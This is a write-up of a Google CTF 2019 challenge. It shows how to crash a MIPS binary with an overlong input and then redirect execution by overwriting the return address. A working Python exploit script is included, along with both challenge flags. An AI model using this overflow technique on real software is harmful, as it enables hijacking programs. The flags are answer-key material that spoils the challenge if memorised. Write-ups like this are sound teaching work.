# STOP GAN (bof) (pwn)

Success, you've gotten the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two seperate things, you think you've rescue them and their brethren by downloading them all to your ships hard drive. They're still being eaten, but this is a fact that has escaped you entirely. Your thoughts swiftly shift to revenge. It's important now to stop this program from destroying these "Cauliflowers" as they're referred to, ever again.

buffer-overflow.ctfcompetition.com 1337

Attachment: [4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a](https://storage.googleapis.com/gctf-2019-attachments/4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a)


### Solution

```bash
> file ./bof
bof: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped
```
Yeah it's MIPS ... Let's take a look in a `console.c` file. This program doesn't do anything special, it just runs the `buf` app using the QEMU emulator.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/**
 * 6e: bufferflow triggering segfault  - binary, compile with:
 * gcc /tmp/console.c -o /tmp/console -static -s
 *
 * Console allows the player to get info on the binary.
 * Crashing bof will trigger the 1st flag.
 * Controlling the buffer overflow in bof will trigger the 2nd flag.
 */

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  char inputs[256];
  printf("Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.\n Bonus flag for controlling the crash.\n");
  while(1) {
    printf("\nConsole commands: \nrun\nquit\n>>");
    if (fgets(inputs, 256, stdin) == NULL) {
      exit(0);
    }
    printf("Inputs: %s", inputs);
    if ( strncmp(inputs, "run\n\0", 256) == 0 ) {
      int result = system("/usr/bin/qemu-mipsel-static ./bof");
      continue;
    } else if ( strncmp(inputs, "quit\n\0", 256) == 0 ) {
      exit(0);
    } else {
      puts("Unable to determine action from your input");
      exit(0);
    }
  }
  return 0;
}
```
`Crashing bof will trigger the 1st flag.` so let's do buffer overflow.
```bash
> nc -v buffer-overflow.ctfcompetition.com 1337
Connection to buffer-overflow.ctfcompetition.com 1337 port [tcp/*] succeeded!
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
CTF{Why_does_cauliflower_threaten_us}
Cauliflower systems never crash >>
segfault detected! ***CRASH***
Console commands:
run
quit
```

**FLAG: CTF{Why_does_cauliflower_threaten_us}**

`Controlling the buffer overflow in bof will trigger the 2nd flag.` In `bof` we can find the `local_flag` function which calls `print_file("flag1")`. It seems that we need to overwrite the return address with 0x0040084C, performing the buffer overflow.

![local_flag](https://raw.githubusercontent.com/mfurga/google-ctf/master/stop_gan/local_flag.png)

Exploit below:

```python
#!/usr/bin/env python2

import socket
import telnetlib
from struct import pack

def dd(n):
  """Define double word in little-endian."""
  return pack('<I', n)

if __name__ == '__main__':
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  s.connect(('buffer-overflow.ctfcompetition.com', 1337))
  s.sendall('run\n')

  payload = 'A' * (256 + 8)
  payload += dd(0x0040084C)[:3]

  s.sendall(payload + '\n')

  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
```
```bash
> python exploit.py
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands: 
run
quit
>>Inputs: run
CTF{controlled_crash_causes_conditional_correspondence}
Cauliflower systems never crash >>

Console commands: 
run
quit
>>
```


**FLAG: CTF{controlled_crash_causes_conditional_correspondence}**